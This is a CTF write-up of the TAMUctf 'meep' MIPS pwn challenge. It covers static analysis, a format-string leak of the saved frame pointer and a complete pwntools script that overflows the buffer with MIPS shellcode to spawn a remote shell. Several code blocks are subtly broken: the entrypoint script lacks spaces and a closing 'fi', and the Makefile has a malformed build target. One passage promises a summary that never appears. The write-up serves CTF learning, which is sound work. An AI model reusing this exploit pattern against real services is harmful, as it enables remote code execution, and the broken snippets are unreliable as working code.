---
title: "[TAMUctf] meep writeup"
published: 2026-03-25
description: An analysis of the TAMUctf meep challenge.
category: CTF
tags: [CTF, writeup, mips, tamuctf]
draft: false
---

# [TAMUctf] - meep

## Problem Overview

- **Category**: pwn
- **Topic**: ROP in mips (but not in FSB lol)

## Problem Description

> The big Meep listens and waits. All it asks for is a name and a command...

<!--more-->
---
### Problem file (`Dockerfile`)
```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y \
    qemu-user-static \
    gdbserver \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /home
COPY meep /home/meep

ARG FLAG_FILE=flag.txt
COPY ${FLAG_FILE} /home/flag.txt

# Copy  MIPS loader & libs into /lib
COPY lib-mips/* /lib/

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 1234 9001

# Run gdbserver via qemu-user-static
ENTRYPOINT ["/entrypoint.sh"]
```

It seems appropriate to use these two ports, `1234` and `9001`.
And when running the container, you need to set a flag file.

### Problem file (`entrypoint.sh`)
```bash
#!/bin/sh

if [ "$DEBUG" = "1" ]; then
    echo "[*] Running in DEBUG mode | Debug port at 1234"
    echo "Use gdb to connect to the process by running 'target remote localhost:1234' from gdb (or gdb-multiarch)"
    exec qemu-mips-static -g 1234./meep
else
    echo "[*] Running in normal mode"
    exec qemu-mips-static./meep
```

Of course, there is a convenient debugging mode like this, so there is no reason not to use it.

### Problem file (`Makefile.debug`)
```makefile
NAME := meep

DOCKER_CONTEXT := default
DOCKER_GLOBAL := --context $(DOCKER_CONTEXT)
GDB_PORT := 1234
VULN_PORT := 9001

CPORTS := 9001
HPORTS := $(CPORTS)
DOCKER_RUNTIME := --read-only --tmpfs /tmp --cap-drop ALL --security-opt no-new-privileges --restart=always

build: Dockerfile
	docker $(DOCKER_GLOBAL) build -t $(NAME). --build-arg FLAG_FILE=fake-flag.txt

run:
	docker $(DOCKER_GLOBAL) run --rm -it -e DEBUG=1 -p $(GDB_PORT):$(GDB_PORT) -p $(VULN_PORT):$(VULN_PORT) --name $(NAME) $(NAME)
```

The first time I properly used `Makefile` was in the 5th grade of elementary school.
For C projects, I invoke the required command directly instead.

In addition, there is a `libc, ld` file for `ROP` in `lib-mips/`.
There is `solver-template.py` with connection information.

---
# static analysis
```bash
$ file meep 
meep: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, BuildID[sha1]=140b4551e8ece2ef8f59a9b207d175713dc18e8f, for GNU/Linux 3.2.0, with debug_info, not stripped
```

The binary is unstripped but contains no useful debug information.
it seems like we are analyzing the binary of the 32-bit MIPS architecture.

```bash
$ checksec --file=./meep
[*] '/home/bankai/Backups_/tamuctf/pwn/meep/meep/meep'
    Arch:       mips-32-big
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    RUNPATH:    b'/lib'
    Stripped:   No
    Debuginfo:  Yes
```

Sounds easy? Let’s solve it with `ROP` as well.

If you open it with **Gidra**, it is roughly a socket communication program.
I knew.

## `main()`
```c
      do {
        do {
          iVar1 = accept(__fd,(sockaddr *)0x0,(socklen_t *)0x0);
        } while (iVar1 < 0);
        dup2(iVar1,0);
        dup2(iVar1,1);
        dup2(iVar1,2);
        greet(in_stack_ffffffc0);
        diagnostics();
        close(iVar1);
      } while( true );
```

Only the important parts were taken.
`dup2` is socket communication, so it means that `stdin/out/err` will be handled well through the socket.

Welcome from `greet()`,
`diagnostics()` receives additional input.

## `greet()`
```c
void greet(_func_int_char_ptr *logger)

{
  code *in_a0;
  _func_int_char_ptr *my_logger;
  char name [128];
  
  send(1,"Enter admin name: ",0x12,0);
  recv(0,name,0x100,0);
  (*in_a0)(&UNK_00400f2c);
  printf(name);
  return;
}
```

`BOF` occurs by default, and there is no particular protection technique.
Just cover the buffer and then cover the 4 bytes saved fp.
Cover ret and you're done.

## `diagnostics()`
```c
void diagnostics(void)

{
  char *checker;
  char *checker2;
  char cmd [128];
  
  send(1,"Enter diagnostic command:\n",0x1b,0);
  recv(0,cmd,0x100,0);
  send(1,"Running command...\n",0x13,0);
  if (cmd[0] == ' ') {
    send(1,"Cannot start with a space!\n",0xb,0);
  }
  if (cmd[0x7f] == ' ') {
    send(1,"Cannot end with a space!\n",0xb,0);
  }
  return;
}
```

Here too, just enter the value without spaces before and after.

Since input is received twice in total,
1. **Leak to FSB**
2. **RET2Shellcode** or **ROP** are possible.

How to use gadgets in `mips`, while there is little knowledge about assembly
I thought there was not much difference in `FSB`, so I turned it this way.

According to what the test taker said, it was...

---
# Dynamic analysis
## Leak around the stack with FSB
```bash
# test
for i in range(6, 20):
   p = remote("localhost", 9001)
   sa(b'Enter admin name:', f'%{i}$p'.encode())
   
   ru(b'Hello:\n\n')
   a = ru(b'Enter diag')
   print(a.decode().split())
   p.close()
```
I thought that usually quite significant values ​​appeared before the 20th factor.
(Actually, I have played it up to the 90th time at most.)

Of course, before turning, put `A * 4` and add several %p.
I also looked to see where it was stored.

it is basically located around the 6th position, so starting from that location...

```bash
[+] Opening connection to localhost on port 9001: Done
['0x3fe3d3b0']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x25372470']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x262626c8']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x40800e8c']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3fffef08']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffff410']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x40800d30']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffd3354']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x4005ad']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffbc2a8']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffbc8a0']
[*] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
```

Quite significant results were obtained.

```bash
─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
00:0000│ s8 sp    0x40800c88 ◂— 0x40800c88
01:0004│-0a4      0x40800c8c ◂— 0x40800c8c...
Roughly this information
```

The stack side address is
`%9$p`, `%12$p` << it is on this side.

However, since `%12$p` is the address `saved fp`, it was decided that the meaning of the reference point was also clear.
The resulting write primitive can be summarized as follows.


After leaking `saved fp` like this,
Go to `diagnostics()` and enter it.

We can just manipulate the frame here and get it over with.
It was a problem that reminded me of solving a dream hack?

Because NX is disabled, I generated MIPS shellcode with pwntools.

---
# PWN!
```py
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./meep")
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a):
    return info(": ".join([n, hex(a)]))


s = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
r = lambda num=4096: p.recv(num)
rl = lambda: p.recvline()
ru = lambda delim, drop=True: p.recvuntil(delim, drop)
l64 = lambda: u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))

if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="meep")
    libc = ELF("./lib-mips/libc.so.6")  # or other exact path
else:
    p = remote("localhost", 9001)
    libc = ELF("./lib-mips/libc.so.6")

# test
#for i in range(6, 20):
#    p = remote("localhost", 9001)
#    sa(b'Enter admin name:', f'%{i}$p'.encode())
#    
#    ru(b'Hello:\n\n')
#    a = ru(b'Enter diag')
#    print(a.decode().split())
#    p.close()

fmt = b'%12$p'
sa(b'Enter admin name:', fmt)

ru(b'Hello:\n\n')
a = ru(b'Enter diag')
slog("leak", int(a.split()[0][:10].decode(), 16))

cmd = int(a.split()[0][:10].decode(), 16) + -144
slog("cmd[128]", cmd)

sc = asm(shellcraft.mips.linux.sh())

s(sc.ljust(140)+p32(cmd))

p.interactive()
```

+) Reviews

For this CTF, I had to leave the skills classes to my friends.
Then it exploded.
